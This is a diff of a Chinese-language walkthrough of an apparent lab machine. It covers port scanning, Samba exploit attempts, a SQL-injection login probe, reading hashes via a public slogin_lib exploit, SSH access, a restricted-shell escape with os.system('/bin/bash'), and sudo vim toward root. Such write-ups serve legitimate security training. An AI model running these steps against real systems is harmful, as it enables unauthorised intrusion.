@@ -144,9 +144,14 @@ HOP RTT     ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 110.11 seconds
 ```
->可以看到开放了22, 113, 139, 445, 8080端口
+<br>
+可以看到开放了22, 113, 139, 445, 8080端口
+<br>
 先来尝试一下smb, 用searchsploit看一下有没有可用的漏洞
+<br>
 nmap下来的版本是3.x-4.x
+<br>
+
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.74]
 └─$ searchsploit samba   
@@ -179,7 +184,9 @@ Samba < 3.0.20 - Remote Heap Overflow                                           
 Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                 | linux_x86/dos/36741.py
 
 ```
->先尝试几个linux的RCE
+
+<br>
+先尝试几个linux的RCE
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.74]
 └─$ searchsploit -m linux/remote/37834.py  
   Exploit: Samba 3.5.11/3.6.3 - Remote Code Execution
@@ -257,11 +264,15 @@ IndexError: string index out of range
     fid = hexlify(pkt_res[0x2a] + pkt_res[0x2b])
 IndexError: string index out of range
 ```
-> 好吧, 并没有结果, 那从web端看看有什么东西
-
+好吧, 并没有结果, 那从web端看看有什么东西
+<br>
 ![IMG](../FILES/Development/img-20220714120610.png)
-> 一个普普通通的web界面
+<br>
+一个普普通通的web界面
+<br>
 用nikto和direseach扫描一下
+<br>
+
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.74]
 └─$ dirsearch -u http://192.168.146.74:8080                   
@@ -301,52 +312,76 @@ Task Completed
 
 
 ```
-> 竟然扫不出来...
-> 后来发现我用dirsearch一扫.. 这个web服务就down了
-> 不知道是我的问题还是这个机器的问题
+
+<br>
+竟然扫不出来...
+<br>
+后来发现我用dirsearch一扫.. 这个web服务就down了
+<br>
+不知道是我的问题还是这个机器的问题
+<br>
 关注一下页面上的信息
 
 ![IMG](../FILES/Development/img-20220714124045.png)
->这里说明了有很多项目在html_pages这个目录里面, 访问一下
+<br>
+这里说明了有很多项目在html_pages这个目录里面, 访问一下
 
 ![IMG](../FILES/Development/img-20220714124121.png)
->竟然能直接看到系统文件
+<br>
+竟然能直接看到系统文件
+<br>
 看一下主页的源代码
 
 ![IMG](../FILES/Development/img-20220714124219.png)
->这里提示让我们找一个development.html的文件, 这不就是刚刚我们在html_pages里面看到的嘛
+<br>
+这里提示让我们找一个development.html的文件, 这不就是刚刚我们在html_pages里面看到的嘛
+<br>
 走着
 
 ![IMG](../FILES/Development/img-20220714124258.png)
->再看一下源代码
+<br>
+再看一下源代码
 
 ![IMG](../FILES/Development/img-20220714124330.png)
->他要我们访问./developmentsecretpage
+<br>
+他要我们访问./developmentsecretpage
 
 ![IMG](../FILES/Development/img-20220714124420.png)
->访问了之后到了一个新的目录
+<br>
+访问了之后到了一个新的目录
+<br>
 点击Patrick's那个a标签的链接, 我被跳转到了patrick.php这个php页面
 
 ![IMG](../FILES/Development/img-20220714124527.png)
->默认情况下我们是在他的用户里面的, 让我们退出试试
+<br>
+默认情况下我们是在他的用户里面的, 让我们退出试试
 
 ![IMG](../FILES/Development/img-20220714124608.png)
->然后我尝试了一下用户名admin, 密码'
+<br>
+然后我尝试了一下用户名admin, 密码'
+<br>
 然后就直接报错了
 
 ![IMG](../FILES/Development/img-20220714124730.png)
->这里有一个slogin_lib.inc.php报错了, 那我们去google看看有没有相关信息
+<br>
+这里有一个slogin_lib.inc.php报错了, 那我们去google看看有没有相关信息
 
->头一个就是个exploit...
+<br>
+头一个就是个exploit...
 ![IMG](../FILES/Development/img-20220714125022.png)
->查看一下exploit的内容
+<br>
+查看一下exploit的内容
 
 ![IMG](../FILES/Development/img-20220714125116.png)
->这里面写到有一个RCE和一个slog_users.txt的文件
+<br>
+这里面写到有一个RCE和一个slog_users.txt的文件
+<br>
 先看看这个txt文件里面有什么
 
->....拿到管理员密码
+<br>
+....拿到管理员密码
 ![IMG](../FILES/Development/img-20220714125321.png)
+<br>
 丢去破解一下md5试试
 
 ```
@@ -358,7 +393,8 @@ qiu, ee64497098d0926d********31f98  	**u
 ```
 只拿到了三个用户名的hash值
 
->然后去连接一下ssh
+<br>然后去连接一下ssh
+
 ```
 └─$ ssh intern@192.168.146.74                                                                                               1 ⨯
 intern@192.168.146.74's password: 
@@ -395,7 +431,10 @@ intern:~$ echo os.system('/bin/bash')
 intern@development:~$ 
 
 ```
->连接上来了
+
+<br>
+连接上来了
+
 ```
 intern@development:~$ id
 uid=1002(intern) gid=1006(intern) groups=1006(intern)
@@ -417,7 +456,10 @@ intern@development:~$ ip a
 intern@development:~$ 
 
 ```
->查看一下这个用户下的文件
+
+<br>
+查看一下这个用户下的文件
+
 ```
 intern@development:~$ ls -al
 total 36
@@ -442,7 +484,10 @@ Congratulations on obtaining a user shell. :)
 intern@development:~$ 
 
 ```
-> 看起来Patrick比较重要, su过去看看
+
+<br>
+看起来Patrick比较重要, su过去看看
+
 ```
 intern@development:~$ su patrick
 Password: 
@@ -460,8 +505,12 @@ User patrick may run the following commands on development:
 patrick@development:/home/intern$ 
 
 ```
->卧*, patrick有两个文件的sudu权限
+
+<br>
+卧*, patrick有两个文件的sudu权限
+<br>
 这里来个小知识, 有sudo权限的可以直接用:shell到root
+
 ```
 patrick@development:/home/intern$ sudo vim
 :
